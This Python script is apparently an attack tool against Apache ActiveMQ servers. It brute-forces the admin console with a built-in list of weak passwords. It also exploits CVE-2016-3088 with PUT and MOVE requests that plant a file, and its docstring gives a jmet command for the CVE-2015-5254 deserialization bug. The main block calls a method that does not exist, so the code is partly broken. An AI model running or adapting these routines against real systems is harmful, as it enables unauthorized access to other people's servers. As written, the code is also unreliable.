# !/usr/bin/env python           
# coding  : utf-8 
# Date    : 2018-04-03 11:53:46
# Author  : b4zinga
# Email   : b4zinga@outlook.com
# Function: ActiveMQ vuln

import base64
import requests


class ActiveMQ:
    def __init__(self, url):
        if '://' not in url:
            url = 'http://' + url
        self.url = url.strip('/')

    def weakPassword(self):
        """ActiveMQ weak password"""
        weak = ['admin','s3cret','password','p@ssw0rd','1qaz2wsx', 'root', 'activemq', 'ActiveMQ']

        if ':8161' in self.url:
            self.url += '/admin/'
        else:
            self.url += ':8161/admin/'

        for user in weak:
            for pwd in weak:
                data = {'Authorization':'Basic '+base64.b64encode((user+':'+pwd).encode()).decode()}
                req = requests.get(self.url, headers=data)

                if not "Unauthorized" in req.text:
                    print('[+] ActiveMQ weak password!\t'+self.url+'\tusername:{}, pwd:{}'.format(user, pwd))
                    return True
        return False

    def putFile(self, user='admin', pwd='admin'):
        """CVE-2016-3088 任意文件上传"""
        headers = {'Authorization' : 'Basic ' + base64.b64encode((user + ':' + pwd).encode()).decode()}
        data = "shell code"

        req = requests.put(self.url+':8161/fileserver/test.txt', headers=headers, data=data)
        if req.status_code == 204:
            print('[+] ActiveMQ put file success')

    def moveFile(self, user='admin', pwd='admin'):
        headers = {
            'Authorization' : 'Basic ' + base64.b64encode((user + ':' + pwd).encode()).decode(),
            'Destination':'file:/tmp/test.txt',
        }
        req = requests.request('MOVE', self.url+':8161/fileserver/shell.txt', headers=headers)
        if req.status_code == 204:
            print('[+] ActiveMQ move file success')

    def deserialization(self):
        """Version: < Apache ActiveMQ 5.13.0
        ActiveMQ 反序列化漏洞(CVE-2015-5254)
        exp: java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME your-ip 61616
        refer: https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2015-5254
        """
        pass



if __name__ == '__main__':
    amq = ActiveMQ(url = '192.168.1.129')
    amq.pathLeakage()